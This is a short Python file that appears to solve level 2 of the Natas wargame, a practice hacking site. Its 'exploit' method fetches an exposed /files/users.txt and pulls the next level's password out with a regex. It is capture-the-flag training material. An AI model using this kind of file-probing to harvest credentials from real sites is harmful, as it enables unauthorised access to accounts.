import re
from src.natas.base_level import NatasLevel

class Level_02(NatasLevel):

  num = 2
  explanation = "After executing Ctrl + U, we see a /files directory. If we access it,\n     we can find /users.txt with the next password."

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url + "/files/users.txt")
    match = re.search(r"^natas3:(.+)$", resp.text, re.MULTILINE)

    return match.group(1)
